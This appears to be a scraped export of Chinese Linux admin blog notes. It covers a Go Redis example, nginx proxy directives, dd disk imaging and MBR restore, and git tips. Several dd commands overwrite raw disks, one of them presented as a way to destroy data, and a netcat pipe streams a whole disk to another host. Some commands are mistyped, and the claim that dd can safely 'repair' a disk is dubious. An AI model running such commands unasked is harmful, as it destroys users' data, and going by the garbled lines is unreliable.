批量地向名称为 usertest 的 hash 中添加元素 name 和 age\n    client.HMSet(\"usertest\", map[string]string{\"name\": \"test\", \"age\":\"20\"})\n    // 批量获取名为 usertest 的 hash 中的指定字段的值.\n    fields, err := client.HMGet(\"usertest\", \"name\", \"age\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"fields in usertest: \", fields)\n\n    // 获取名为 userxys 的 hash 中的字段个数\n    length, err := client.HLen(\"userxys\").Result()\n    if err != nil {\n        panic(err)\n    }\n    fmt.Println(\"field count in userxys: \", length) // 字段个数为2\n\n    // 删除名为 usertest 的 age 字段\n    client.HDel(\"usertest\", \"age\")\n    age, err := client.HGet(\"usertest\", \"age\").Result()\n    if err != nil {\n        fmt.Printf(\"Get usertest age error: %v\\n\", err)\n    } else {\n        fmt.Println(\"user_test age is: \", age) // 字段个数为2\n    }\n}\n\n// redis.v4 的连接池管理\nfunc connectPool(client *redis.Client) {\n    wg := sync.WaitGroup{}\n    wg.Add(10)\n\n    for i := 0; i \u003c 10; i++ {\n        go func() {\n            defer wg.Done()\n\n            for j := 0; j \u003c 100; j++ {\n                client.Set(fmt.Sprintf(\"name%d\", j), fmt.Sprintf(\"xys%d\", j), 0).Err()\n                client.Get(fmt.Sprintf(\"name%d\", j)).Result()\n            }\n\n            fmt.Printf(\"PoolStats, TotalConns: %d, FreeConns: %d\\n\", client.PoolStats().TotalConns, client.PoolStats().FreeConns);\n        }()\n    }\n\n    wg.Wait()\n}\n`","tags":null},{"location":"//blog.pytool.com/Post/nginx/2016-01-01 Linux命令 nginx proxy","title":"Linux命令 Nginx proxy","text":"【译】Ngnix实现一个缓存和缩略处理的反向代理服务器 - QueenKing - SegmentFault\nLinux 运维 » Nginx 代理 配置详解\n\nproxyrediect 用于修改[nginx代理服务器] 发给-  [浏览器客户端] Header的 location 和 Refresh\n\nproxysetheader 用于添加[nginx代理服务器] 发给-  [web应用服务器] 请求数据时Header信息,通过添加Header头信息Host，来指定请求的域名，后端web服务器才能识别该反向代理访问请求由哪个虚拟主机来处理。\n\nNginx配置proxypass转发的/路径问题\n\n在nginx中配置proxypass时，如果是按照^~匹配路径时,要注意proxypass后的url最后的/\n当加上了/，相当于是绝对根路径，则nginx不会把location中匹配的路径部分代理走;\n如果没有/，则会把匹配的路径部分也给代理走。\n\nlocation ^~ /staticjs/\n{\nproxycache jscache;\nproxysetheader Host js.test.com;\nproxypass http://js.test.com/;\n}\n\n如上面的配置，如果请求的url是http://127.0.0.1/staticjs/test.html\n会被代理成http://js.test.com/test.html\n当然，我们可以用如下的rewrite来实现/的功能\n\nlocation ^~ /staticjs/\n{\nproxycache jscache;\nproxysetheader Host js.test.com;\nrewrite /staticjs/(.+)$ /$1 break;\nproxypass http://js.test.com;\n\n}\n\n而如果这么配置\n\nlocation ^~ /staticjs/\n{\nproxycache jscache;\nproxysetheader Host js.test.com;\nproxypass http://js.test.com;\n}\n\n则会被代理到http://js.test.com/staticjs/test.htm\n\n nginx proxypass 后面的url 加与不加/的区别\n\n注：\n\n[是不是带 / ] 是在proxypass 指令后面,而不是 location后面，location后面的/对proxypass没有影响\nproxypass 后是否有 / 决定代理结果 url是否加上匹配的 location\n\n在nginx中配置proxypass时，当在后面的url加上了/，相当于是绝对根路径，则nginx向proxy请求时不会把location中匹配的路径部分代理走;，但是浏览器url中是带location路径的\n如果没有/，则会把匹配的路径部分也给代理走。\n\n下面四种情况分别用GET  进行访问。\n\n浏览器请求url都是一致的: http://linyibr.com/proxy/index.html\nlocation后面的/对proxypass没有影响 只决定匹配的是文件还是目录\nlocation  /proxy {\n      proxypass http://127.0.0.1:81;\n      代理url:   http://127.0.0.1:81/proxy/index.html\n\n      # 技巧：在配置子目录做为子站点的时候增加'/'非常好用\n      proxypass http://127.0.0.1:81/;\n      #代理url:   http://127.0.0.1:81/index.html\n\n      proxypass http://127.0.0.1:81/ftlynx;\n      #代理url:   http://127.0.0.1:81/ftlynxindex.html\n\n      proxypass http://127.0.0.1:81/ftlynx/;\n      #代理url:   http://127.0.0.1:81/ftlynx/index.html\n\n}\n\n上面的结果都是本人结合日志文件测试过的。从结果可以看出，应该说分为两种情况才正确。即http://127.0.0.1:81 (上面的第二种) 这种和 http://127.0.0.1:81/…. （上面的第1，3，4种） 这种。\n在以上配置中，192.168.1.202没有“/”，而192.168.1.203有一个“/”,但是由于location 配置的URI为/server/，所以，访问到192.168.1.202正常为/server/，访问192.168.1.203的时候，则直接变成了 / ,也就是说 访问的时候变成了：192.168.1.202/server/index.html     192.168.1.203/index.html\n\n以上就是 \"/\" 的区别！\n\n1.16\nproxyrediect 用于修改被代理服务器返回 Header的 location 和 Refresh\nproxyredirect会将应用服务器返回[nginx代理服务器]的响应头中的location字段进行修改后返回给客户端\n\nproxyredirect http://localhost:8000/two/ http://frontend/one/;\n将Location字段重写为http://frontend/one/some/uri/。\n在代替的字段中可以不写服务器名：\n\nproxyredirect http://localhost:8000/two/ /;\n这样就使用服务器的基本名称和端口，即使它来自非80端口。\n如果使用“default”参数，将根据location和proxypass参数的设置来决定。\n例如下列两个配置等效：\n\nlocation /one/ {\n    proxypass       http://upstream:port/two/;\n    proxyredirect   default;\n\n    proxyredirect   http://upstream:port/two/   /one/;\n    }\n在指令中可以使用一些变量：\n\nproxyredirect   http://localhost:8000/    http://$host:$serverport/;\n这个指令有时可以重复：\n\nproxyredirect   default;  \nproxyredirect   http://localhost:8000/    /;  \nproxyredirect   ;  /;\n\n利用这个指令可以为被代理服务器发出的相对重定向增加主机名：\n\n用于修改被代理服务器返回的响应头中的location头域和“Rsfresh”头域，与proxypass配合使用，该指令可以把代理服务器返回的地址信息更改为需要的地址信息\n语法如下三种：\n            (1)proxyredirect redirect replacement;\n               redirect 匹配location头域值得字符串\n               replacement 用于替换redirect 变量内容的字符串\n             eg:\n                假如被代理服务器返回的响应头中“location”头域为：\n                 Location:http://localhost:8081/proxy/some/uri/\n                设置为：\n                 proxyredirect http://localhost:8081/proxy/ http://mylinuxer/frontend/;\n                Nginx服务器会将Location头域信息更改为\n                 Location:http://mylinuxer/frintend//some/uri/  \n            (2)proxyredirect default;\n             eg:\n                location块的uri变量作为replacement,并使用proxypass变量作为redirect\n                location /server/\n                  {\n                     proxypass http://proxyserver/source/;\n                     proxyredirect default;\n                  }\n            (3)proxyredirect off;\n              使用此方法，可将当前作用域下面的所有的proxyredirect指令配置全部设置为无效\n\n1.6\nproxysetheader field value;\n更改nginx服务器接收到的客户端请求的请求头信息，然后将心的请求头发送给被代理的服务器\nfield  要更改的信息所在的头域\nvalue  更改的值，支持使用文本、变量或者变量的组合\n默认情况下为以下设置：\n   proxysetheader Host $proxyhost;  \n   proxysetheader Connection close;\n\nproxysetheader Host $httphost;\n\n这句话把我和 nginx 通信的 HTTP 头原封不动的发给了 目的服务器\n我以为这句话的意思是： Nginx 向目的服务器请求的时候替换成目的服务器的 Host ，实际没有\n真正的做法是 proxysetheader Host $proxyhost;\nproxysetheader Host       $host:$proxyport;\n\n1.2\nproxyhideheader field;\n设置nginx服务器在发送HTTP相应时，隐藏一些头域信息，field为需要隐藏的头域\n\n1.3\nproxypassheader field;\n设置nginx服务器在发送响应报文时候，报文中不包含\"Date\" \"Server\" \"X-Accel\"等来自被代理服务器的头域信息，field为需要发送的头域.\n\n1.4\nproxypassrequestbody on|off;\n设置是否将客户端请求的请求体发送给代理服务器，默认设置为开启on\n\n1.5\nproxypassrequestheaders on|off;\n设置是否将客户端请求的请求头发送给代理服务器，默认设置为开启on\n\n1.7\nproxysetbody value;\n更改nginx服务器接收到的客户端请求的请求体信息，value为更改的信息\n\n1.8\nproxybind address;\n如果我们希望代理连接由指定主机处理，可修改此配置，address为IP地址\n\n1.9\nproxyconnecttimeout time;\n配置nginx服务器与后端被代理服务器尝试建立连接的超时时间，默认为60s\n\n1.10\nproxyreadtimeout time;\n配置nginx服务器向后端被代理服务器发出read请求后，等待响应的超时时间，默认为60s\n\n1.11\nproxysendtimeout time;\n配置nginx服务器向后端被代理服务器发出write请求后，等待响应的超时时间，默认为60s\n\n1.12\nproxyhttpversion 1.0|1.1\n设置nginx服务器提供代理服务的HTTP协议版本，默认为1.0,1.1版本支持upsteam服务器组设置中的keepalive指令\n\n1.13\nproxymethod method;\n设置Nginx服务器请求被代理服务器时使用的请求方法，method可设置为POST和GET，不加引号，设置了该指令，客户端的请求方法将被忽略\n\n1.14\nproxyignoreclientabort on|off;\n设置在客户端终端网络请求时，Nginx服务器是否中断对被代理服务器的请求，默认为off中断\n\n1.15\nproxyignoreheaders field ...;\n设置一些HTTP的响应头中的头域，field为要设置的HTTP响应头的头域，如\"X-Accel-Redirect\"、\"X-Accel-Expires\"、\"Expires\"、\"Cache-Control\"、\"Set-Cookie\"等\n\n1.17\nproxyintercepterrors on|off;\n配置一个状态是否开启，在开启时，如果被代理的服务器返回的HTTP状态代码为400或者大于400，则nginx服务器使用自己预定义的错误页（使用errorpage指令），如果是关闭状态，则直接将被代理服务器返回的HTTP状态返回给客户端\n\n1.18\nproxyheadershashmaxsize size;\n配置存放http报文头的哈希表的容量，默认为512个字符，siez为字符大小\n\n1.19\nproxyheadershashbucketsize size;\n设置nginx服务器申请存放http报文头的哈希表容量的单位大小，默认为64个字符\n\n1.20\nproxynextupstream status ....；\n可以使用该指令配置在服务器(组)发生哪些异常情况时，将请求顺序交个下一个服务器处理\nstatus设置服务器返回状态，可以是一个或多个\nerror 连接错误\ntimeout 超时\ninvalidheader响应头为空或无效\nhttp500|http502|http504|http404，被代理服务器返回500 502 504 404状态代码\noff 无法将请求发送给被代理服务器\n\n1.21\nproxysslsessionreuse on|off;\n配置是否基于SSL安全协议的会话连接(https://)，默认为开启状态\n\nURI 在于I(Identifier)是统一资源标示符，可以唯一标识一个资源。URL在于Locater，一般来说（URL）统一资源定位符，可以提供找到该资源的路径，比如http://www.zhihu.com/question/21950864，但URL又是URI，因为它可以标识一个资源，所以URL又是URI的子集。\n举个是个URI但不是URL的例子：urn:isbn:0-486-27557-4，这个是一本书的isbn，可以唯一标识这本书，更确切说这个是URN。总的来说，locators are also identifiers, so every URL is also a URI, but there are URIs which are not URLs.\n\n对 \"/\" 启用反向代理\nlocation / {\nproxypass http://127.0.0.1:88;\nproxyredirect off;\nproxysetheader X-Real-IP $remoteaddr;\n后端的Web服务器可以通过X-Forwarded-For获取用户真实IP\nproxysetheader X-Forwarded-For $proxyaddxforwardedfor;\n\n以下是一些反向代理的配置，可选。\nproxysetheader Host $host;\nclientmaxbodysize 10m; 允许客户端请求的最大单文件字节数\nclientbodybuffersize 128k; #缓冲区代理缓冲用户端请求的最大字节数，\nproxyconnecttimeout 90; #nginx跟后端服务器连接超时时间(代理连接超时)\nproxysendtimeout 90; #后端服务器数据回传时间(代理发送超时)\nproxyreadtimeout 90; #连接成功后，后端服务器响应时间(代理接收超时)\nproxybuffersize 4k; #设置代理服务器（nginx）保存用户头信息的缓冲区大小\nproxybuffers 4 32k; #proxybuffers缓冲区，网页平均在32k以下的设置\nproxybusybufferssize 64k; #高负荷下缓冲大小（proxybuffers*2）\nproxytempfilewritesize 64k;\n设定缓存文件夹大小，大于这个值，将从upstream服务器传\n}\n\nproxy.conf配置文件：\nproxyredirect off;\nproxysetheader Host $host;\nproxysetheader X-Real-IP $remoteaddr;\nproxysetheader X-Forwarded-For $proxyaddxforwardedfor;\nclientmaxbodysize 50m;  允许客户端请求的最大单个文件字节数\nclientbodybuffersize 256k; # 缓冲区代理缓冲客户端请求的最大字节数\nproxyconnecttimeout 30; # 连接后端服务器超时时间\nproxysendtimeout 30; # 后端服务器发送数据超时时间,连接以及建立\nproxyreadtimeout 60; # 后端服务器响应请求超时时间,从开始发送到接受完毕\nproxybuffersize 4k; # 代理请求缓存区大小\nproxybuffers 4 32k;\nproxybusybufferssize 64k; #系统繁忙时可申请的proxybuffers大小\nproxytempfilewritesize 64k; #proxy缓存临时文件的大小\nproxynextupstream error timeout invalidheader http500 http503 http404;\n故障转移\nproxymaxtempfilesize 128m;\nproxysetheader指令用于在向反向代理的后端web服务器发起请求时添加指定Header头信息，当后端web服务器上有多个基于域名的虚拟主机时，要通过添加Header头信息Host，来指定请求的域名，这样后端web服务器才能识别该反向代理访问请求由哪个虚拟主机来处理。\n\n技巧：在配置子目录做为子站点的时候增加'/'非常好用\n\n nginx大文件下载优化\n\n默认情况下proxymaxtempfilesize值为1024MB,也就是说后端服务器的文件不大于1G都可以缓存到nginx代理硬盘中，如果超过1G，那么文件不缓存，而是直接中转发送给客户端.如果proxymaxtempfilesize设置为0，表示不使用临时缓存。\n\n在大文件的环境下，如果想启用临时缓存，那么可以修改配置，值改成你想要的。\n修改nginx配置\nlocation /\n {\n ...\n proxymaxtempfilesize 2048m;\n ...\n }\n # nginx proxy buffer 解释\n\n遇到一例 nginx buffer 设置太小，如果 URL 比较长导致 504 错误的故障。可以看看这篇网站502与504错误分析。\n\n下面总结下 nginx buffer 设置：\nproxybuffersize 4k;\nproxybuffering on;\nproxybuffers 4 4k;\nproxybusybufferssize 8k;\nproxymaxtempfilesize 1024m;\n\n首先，这些参数都是针对每一个http request ，不是全局的。\nproxybuffering\n\nproxybuffering 开启的时候，proxybuffers 和proxybusybufferssize 才会起作用，无论proxybuffering 是否开启，proxybuffersize 都起作用。\nproxybuffersize\n\nproxybuffersize 用来接受后端服务器 response 的第一部分，小的response header 通常位于这部分响应内容里边。默认proxybuffersize 被设置成 proxybuffers 里一个buffer 的大小，当然可以设置更小些。\n\n① 如果 proxybuffers 关闭\n\nNginx不会尝试获取到后端服务器所有响应数据之后才返回给客户端，Nginx 会尽快把数据传给客户端，在数据传完之前，Nginx 接收到的最大缓存大小不能超过 proxybuffersize 。\n\n② 如果 proxybuffers 打开\n\nNginx将会尽可能的读取后端服务器的数据到buffer，直到proxybuffers设置的所有buffer们被写满或者数据被读取完(EOF)，此时Nginx开始向客户端传输数据，会同时传输这一整串buffer们。如果数据很大的话，Nginx会接收并把他们写入到tempfile里去，大小由proxymaxtempfilesize 控制。「当数据没有完全读完的时候」，Nginx同时向客户端传送的buffer 大小 不能超过 proxybusybufferssize 「此句可能理解有误」。\nproxybusybufferssize 的官方解释：\n\nWhen buffering of responses from the proxied server is enabled, limits the total sizeof buffers that can be busy sending a response to the client while the response is not yet fully read. In the meantime, the rest of the buffers can be used for reading the response and, if needed, buffering part of the response to a temporary file. By default, size is limited by the size of two buffers set by the proxybuffersize andproxybuffers directives.\n\n另外，proxybuffering 为off 的时候，Nginx 的cache 无效「即 proxy_cache 那一坨命令设置的cache 无效 」 。","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 dd","title":"Linux命令 dd","text":"---\n\ntime dd if=/dev/zero of=test.dbf bs=8k count=131072  # 1G\ntime dd if=/dev/mapper/VolGroup-lvdata of=/dev/null bs=8k\n\ntime dd if=/dev/sda1 of=test.dbf bs=8k\ndu -sm test.dbf\n hdparm -Tt /dev/sda\n\n446个引导代码+ 64 个字节分区表DPT信息+ 2 magic(0x55AA) =512字节. 整个mbr.\n紧跟MBR 之后的是DBR（Dos Boot Record） 62个扇区的 操作系统引导扇区 grub就装在这里\n\nMBR分区结构、DPT分区表、EBR扩展引导\n硬盘分区表知识——详解硬盘MBR (转) - JarryHua - 博客园\n\nUbuntu备份与还原 - Ubuntu中文\ndd\n备份mbr\n dd if=/dev/sda of=/backup/mbr.img bs=512 count=1\n\n还原mbr\n dd if=/backup/mbr.img of=/dev/sda bs=446 count=1\n\n还原分区表,跳过主引导记录\n dd if=/backup/mbr.img skip=446 of=/dev/sda seek=446 bs=1 count=64\n\n注意: skip对应if，seek对应of 跳过[skip x bs]字节数 446x1 byte 千万别弄混了\n\n我实测的结果是：\n备份sda第一块硬盘debian的grub引导记录和硬盘分区表如下(备份第一硬盘的前63个扇区，第一硬盘分区表在第一扇区的第447-510字节)\ndd if=/dev/sda of=debian.mbr  bs=512 count=63\n说明：块大小为512字节(一个扇区的大小)，读取硬盘的前63个扇区\n\n恢复引导记录MBR 恢复到第二快硬盘sdb，但是不修改第二块分区表的命令\ndd if=debian.mbr of=/dev/sdb  bs=446 count=1\n  这里是将sda的引导记录的第一扇区的前446字节恢复到sdb第一扇区\n\n恢复操作系统引导扇区1-63\n dd if=debian.mbr skip=1 of=/dev/sdb seek=1 bs=512 \n这条命令是把sda的引导记录的后62扇区记录跳过sdb的第一扇区执行写入。\n\n警告：进行写入之前，必须先备份好sdb的mbr和分区表：dd if=/dev/sdb of=目标路径/sdb.mbr 然后方可执行上面的操作。我用上面的方法，实现了第二硬盘可以引导第一硬盘的debian。前面有过失败的教训，我将第一硬盘的sda.mbr 直接dd if=sda.mbr of=/dev/sdb 结果第二硬盘的分区表丢失，因为sda.mbr是第一块硬盘前63扇区的备份，已经包含了第一扇区的第447-510字节的分区表记录。所以在我执行完dd命令后，马上用fdisk -l 才发觉我的第二块硬盘的分区表已经和第一块分区表一样了（两块硬盘都是500G）。幸亏第二块硬盘我是刚刚开始使用，只是放了一些无用的数据。否则后果不堪设想。所以建议大家执行dd恢复mbr前必须备份原来的mbr，执行完dd恢复后建议fdisk -l 检查一下。\n\n首先我纠正我的错误，正确的是：skip对应if，seek对应of\n我猜想，除了前面446byte的mbr引导代码外，我的debian是grub1.99的，剩下的62个扇区可能是grub1.99额外的代码。因为我如果备份的总扇区小于63，恢复到u盘或者第二快硬盘后，就无法通过u盘或者第二快硬盘引导\n\n此外,dd还可以克隆整个硬盘和分区,不论你的文件系统是什么类型都可以,但是由于速度较慢,一般不建议这么做,克隆U盘倒是很推荐,另外还可以转换光盘为ISO\n克隆硬盘\ndd if=/dev/sda of=/sda.img\n\n克隆分区\ndd if=/dev/sda1 of=/sda1/img\n\n制作光盘镜像\ndd if=/dev/cdrom of=/cdrom.iso\n\n其实上面的后缀有没有都无所谓,加了后缀只是方便自己理解\n\n自从2007年Vista操作系统推出以后，各大硬件厂商对于硬件开发速度明显加快，其中对于硬盘的速度和容量，从最早的5400转，160G容量，提升到现在的7200转甚至万转机械盘，容量也先后出现上TB级别的。单硬盘都出现4Tb容量。\n\n由于磁盘容量越来越大，传统的MBR分区表（主引导记录）已经不能满足大容量磁盘的需求。传统的MBR分区表只能识别磁盘前面的2.2TB左右的空间，对于后面的多余空间只能浪费掉了，而对于单盘4TB的磁盘，只能利用一半的容量。因此，才有了GPT（全局唯一标识分区表）。\n\n除此以外，MBR分区表只能支持4个主分区或者3主分区+1扩展分区（包含随意数目的逻辑分区），而GPT在Windows下面可以支持多达128个主分区。\n\n硬盘分区表扫盲：MBR和GPT表，你在用哪一样？\n\nMBR分区表：\n\n在传统硬盘分区模式中，引导扇区是每个分区（Partition）的第一扇区，而主引导扇区是硬盘的第一扇区。它由三个部分组成，主引导记录MBR、硬盘分区表DPT和硬盘有效标志。在总共512字节的主引导扇区里MBR占446个字节，第二部分是Partition table区（分区表），即DPT，占64个字节，硬盘中分区有多少以及每一分区的大小都记在其中。第三部分是magic number，占2个字节，固定为55AA。\n\n一个扇区的硬盘主引导记录MBR由4个部分组成。\n\n• 主引导程序（偏移地址0000H--0088H），它负责从活动分区中装载，并运行系统引导程序。 0-136\n\n• 出错信息数据区，偏移地址0089H--00E1H为出错信息，00E2H--01BDH全为0字节。      137-225 226-445\n\n• 分区表（DPT，Disk Partition Table）含4个分区项，偏移地址01BEH--01FDH，每个分区表项长16个字节，共64字节为分区项1、分区项2、分区项3、分区项4。\n\n• 结束标志字，偏移地址01FE--01FF的2个字节值为结束标志55AA,如果该标志错误系统就不能启动。\n\nGPT分区表：\n\nGPT的分区信息是在分区中，而不象MBR一样在主引导扇区，为保护GPT不受MBR类磁盘管理软件的危害，GPT在主引导扇区建立了一个保护分区（Protective MBR）的MBR分区表（此分区并不必要），这种分区的类型标识为0xEE，这个保护分区的大小在Windows下为128MB，Mac OS X下为200MB，在Window磁盘管理器里名为GPT保护分区，可让MBR类磁盘管理软件把GPT看成一个未知格式的分区，而不是错误地当成一个未分区的磁盘。\n\n另外，为了保护分区表，GPT的分区信息在每个分区的头部和尾部各保存了一份，以便分区表丢失以后进行恢复。\n\n对于基于x86/64的Windows想要从GPT磁盘启动，主板的芯片组必须支持UEFI（这是强制性的，但是如果仅把GPT用作数据盘则无此限制），例如Win8/Win8.1原生支持从UEFI引导的GPT分区表上启动，大多数预装Win8系统的电脑也逐渐采用了GPT分区表。至于如何判断主板芯片组是否支持UEFI，一般可以查阅主板说明书或者厂商的网址，也可以通过查看BIOS设置里面是否有UEFI字样。\n\n一、dd命令\n\ndd：用指定大小的块拷贝一个文件，并在拷贝的同时进行指定的转换。\n\n注意：指定数字的地方若以下列字符结尾，则乘以相应的数字：b=512；c=1；k=1024；w=2\n\n参数注释：\n\nif=文件名：输入文件名，缺省为标准输入。即指定源文件。 if=input file \nskip=blocks：从输入if文件开头跳过blocks个块后再开始复制。\n\nof=文件名：输出文件名，缺省为标准输出。即指定目的文件。 of=output file \nseek=blocks：从输出of文件开头跳过blocks个块后再开始复制。\n\nbs=bytes：同时设置读入/输出的块大小为bytes个字节。\n  ibs=bytes：一次读入bytes个字节，即指定一个块大小为bytes个字节。\n  obs=bytes：一次输出bytes个字节，即指定一个块大小为bytes个字节。\n  cbs=bytes：一次转换bytes个字节，即指定转换缓冲区大小。\n  注意：通常只用当输出文件是磁盘或磁带时才有效，即备份到磁盘或磁带时才有效。\ncount=blocks：仅拷贝blocks个块，块大小等于ibs指定的字节数。\nconv=conversion：用指定的参数转换文件。\n    ascii：转换ebcdic为ascii\n    ebcdic：转换ascii为ebcdic\n    ibm：转换ascii为alternate ebcdic\n    block：把每一行转换为长度为cbs，不足部分用空格填充\n    unblock：使每一行的长度都为cbs，不足部分用空格填充\n    lcase：把大写字符转换为小写字符\n    ucase：把小写字符转换为大写字符\n    swab：交换输入的每对字节\n    noerror：出错时不停止\n    notrunc：不截短输出文件\n    sync：将每个输入块填充到ibs个字节，不足部分用空（NUL）字符补齐。\n\n二、dd应用实例\n\n将本地的/dev/hdb整盘备份到/dev/hdd\n\n dd if=/dev/hdb of=/dev/hdd\n\n将/dev/hdb全盘数据备份到指定路径的image文件\n\n dd if=/dev/hdb of=/root/image\n\n将备份文件恢复到指定盘\n\n dd if=/root/image of=/dev/hdb\n\n备份/dev/hdb全盘数据，并利用gzip工具进行压缩，保存到指定路径\n\n dd if=/dev/hdb | gzip   /root/image.gz\n\n将压缩的备份文件恢复到指定盘\n\n gzip -dc /root/image.gz | dd of=/dev/hdb\n\n备份与恢复MBR\n\n备份磁盘开始的512个字节大小的MBR信息到指定文件：\n\n dd if=/dev/hda of=/root/image count=1 bs=512\n\ncount=1指仅拷贝一个块；bs=512指块大小为512个字节。\n\n恢复：\n\n dd if=/root/image of=/dev/had\n\n将备份的MBR信息写到磁盘开始部分\n\n备份软盘\n\n dd if=/dev/fd0 of=disk.img count=1 bs=1440k (即块大小为1.44M)\n\n拷贝内存内容到硬盘\n\n dd if=/dev/mem of=/root/mem.bin bs=1024 (指定块大小为1k)\n\n拷贝光盘内容到指定文件夹，并保存为cd.iso文件\n\n dd if=/dev/cdrom(hdc) of=/root/cd.iso\n\n10. 增加swap分区文件大小\n\n第一步：创建一个大小为256M的文件：\n\n dd if=/dev/zero of=/swapfile bs=1024 count=262144\n\n第二步：把这个文件变成swap文件：\n\n mkswap /swapfile\n\n第三步：启用这个swap文件：\n\n swapon /swapfile\n\n第四步：编辑/etc/fstab文件，使在每次开机时自动加载swap文件：\n\n/swapfile swap swap default 0 0\n\n11. 销毁磁盘数据\n\n dd if=/dev/urandom of=/dev/hda1\n\n注意：利用随机的数据填充硬盘，在某些必要的场合可以用来销毁数据。\n\n12. 测试硬盘的读写速度\n\n dd if=/dev/zero bs=1024 count=1000000 of=/root/1Gb.file\n\n dd if=/root/1Gb.file bs=64k | dd of=/dev/null\n\n通过以上两个命令输出的命令执行时间，可以计算出硬盘的读、写速度。\n\n13. 确定硬盘的最佳块大小：\n\n dd if=/dev/zero bs=1024 count=1000000 of=1Gb.file\n\n dd if=/dev/zero bs=2048 count=500000 of=1Gb.file\n\n dd if=/dev/zero bs=4096 count=250000 of=1Gb.file\n\n dd if=/dev/zero bs=8192 count=125000 of=1Gb.file\n\n通过比较以上命令输出中所显示的命令执行时间，即可确定系统最佳的块大小。\n\n14. 修复硬盘：\n\n dd if=/dev/sda of=/dev/sda 或dd if=/dev/hda of=/dev/hda\n\n当硬盘较长时间(一年以上)放置不使用后，磁盘上会产生magnetic flux point，当磁头读到这些区域时会遇到困难，并可能导致I/O错误。当这种情况影响到硬盘的第一个扇区时，可能导致硬盘报废。上边的命令有可能使这些数 据起死回生。并且这个过程是安全、高效的。\n\n15. 利用netcat远程备份\n\n dd if=/dev/hda bs=16065b | netcat  targethost-IP  1234\n\n在源主机上执行此命令备份/dev/hda\n\n netcat -l -p 1234 | dd of=/dev/hdc bs=16065b\n\n在目的主机上执行此命令来接收数据并写入/dev/hdc\n\n netcat -l -p 1234 | bzip2   partition.img\n\n netcat -l -p 1234 | gzip   partition.img\n\n以上两条指令是目的主机指令的变化分别采用bzip2、gzip对数据进行压缩，并将备份文件保存在当前目录。\n\n16. 将一个很大的视频文件中的第i个字节的值改成0x41（也就是大写字母A的ASCII值）\n\necho A | dd of=bigfile seek=$i bs=1 count=1 conv=notrunc\n三、/dev/null和/dev/zero的区别\n\n/dev/null，外号叫无底洞，你可以向它输出任何数据，它通吃，并且不会撑着！\n\n/dev/zero，是一个输入设备，你可你用它来初始化文件。该设备无穷尽地提供0，可以使用任何你需要的数目——设备提供的要多的多。他可以用于向设备或文件写入字符串0。\n\n/dev/null——它是空设备，也称为位桶（bit bucket）。任何写入它的输出都会被抛弃。如果不想让消息以标准输出显示或写入文件，那么可以将消息重定向到位桶。\nif=/dev/zero of=./test.txt bs=1k count=1\nls –l\ntotal 4\n-rw-r--r-- 1 oracle dba 1024 Jul 15 16:56 test.txt\nfind / -name accesslog 2  /dev/null\n3.1使用/dev/null\n\n把/dev/null看作”黑洞”， 它等价于一个只写文件，所有写入它的内容都会永远丢失.，而尝试从它那儿读取内容则什么也读不到。然而， /dev/null对命令行和脚本都非常的有用\n\n禁止标准输出\n\ncat $filename   /dev/null 文件内容丢失，而不会输出到标准输出.\n\n禁止标准错误\n\nrm $badname 2  /dev/null #这样错误信息[标准错误]就被丢到太平洋去了\n\n禁止标准输出和标准错误的输出\n\ncat $filename 2  /dev/null   /dev/null\n\n如果”$filename”不存在，将不会有任何错误信息提示；如果”$filename”存在， 文件的内容不会打印到标准输出。因此，上面的代码根本不会输出任何信息。当只想测试命令的退出码而不想有任何输出时非常有用。\n3.2使用/dev/zero\n\n像/dev/null一样， /dev/zero也是一个伪文件， 但它实际上产生连续不断的null的流（二进制的零流，而不是ASCII型的）。 写入它的输出会丢失不见， 而从/dev/zero读出一连串的null也比较困难， 虽然这也能通过od或一个十六进制编辑器来做到。\n\n/dev/zero主要的用处是用来创建一个指定长度用于初始化的空文件，就像临时交换文件。\n\n用/dev/zero创建一个交换临时文件\n!/bin/bash\n 创建一个交换文件.\nROOTUID=0 # Root 用户的 $UID 是 0.\nEWRONGUSER=65 # 不是 root?\nFILE=/swap\nBLOCKSIZE=1024\nMINBLOCKS=40\nSUCCESS=0\n这个脚本必须用root来运行.\nif [ \"$UID\" -ne \"$ROOTUID\" ]\nthen\necho; echo \"You must be root to run this script.\"; echo\nexit $EWRONGUSER\nfi\nblocks=${1:-$MINBLOCKS}  如果命令行没有指定，\n+ 则设置为默认的40块.\n 上面这句等同如：\n#","tags":null},{"location":"//blog.pytool.com/cmd/2016-01-01 Linux命令 git","title":"Linux命令 git","text":"\n\n高富帅们的Git技巧 - 新闻 - SegmentFault\n\ngit代理设置方法解决\n\ngit config --global https.proxy http://127.0.0.1:1080\n\ngit config --global https.proxy https://127.0.0.1:1080\n\ngit config --global --unset http.proxy\n\ngit config --global --unset https.proxy\n\nnpm config delete proxy\n\ngit config --global http.proxy 'socks5://127.0.0.1:1080'\ngit config --global https.proxy 'socks5://127.0.0.1:1080'\n\n 对比指定目录与上次提交之间的差别(或者更准确的 说是在当前分支)。\ngit diff HEAD -- ./lib\n恢复指定目录文件\ngit checkout HEAD~ application/admin/\n\n 这条命令把hello.rb从HEAD中签出并且把它恢复成未修改时的样子.\n git checkout -- hello.rb\n\n                                         remote repo\nworking            staging               local repo\n工作区               暂存区                  本地仓库\n        add          -  commit    -  \u003c-   rm --cached   \u003c-         reset --soft      \n  \u003c-                 checkout\n\n当我们需要删除暂存区或分支上的文件, 同时工作区也不需要这个文件了, 可以使用\ngit rm filepath          同时删除 staging staging\n当我们需要删除暂存区或分支上的文件, 但本地又需要使用, 只是不希望这个文件被版本控制, 可以使用\ngit rm --cached filepath 仅删除staging 保留staging\n\ngit rm -r --cached .\n\nfilter-branch\n--tree-filter表示修改文件列表。\n--msg-filter表示修改提交信息，原提交信息从标准输入读入，新提交信息输出到标准输出。\n--prune-empty表示如果修改后的提交为空则扔掉不要。在一次试运行中我发现虽然文件被删除了，但是还剩下个空的提交，就查了下 man 文档，找到了这个选项。\n-f --force  是忽略备份。不加这个选项第二次运行这个命令时会出错，意思是 git 上次做了备份，现在再要运行的话得处理掉上次的备份。\n--all是针对所有的分支。\n\n Removing sensitive data from a repository 移除项目中的敏感信息\n\ngit filter-branch --force --index-filter \\\n'git rm --cached --ignore-unmatch 要删除的文件名' \\\n--prune-empty --tag-name-filter cat -- --all\n\necho \"YOUR-FILE-WITH-SENSITIVE-DATA\"     .gitignore\ngit add .gitignore\ngit commit -m \"Add YOUR-FILE-WITH-SENSITIVE-DATA to .gitignore\"\n\ngit push origin --force --all\ngit push origin --force --tags\n\n彻底删除已经从本地仓库缓存的文件\ngit 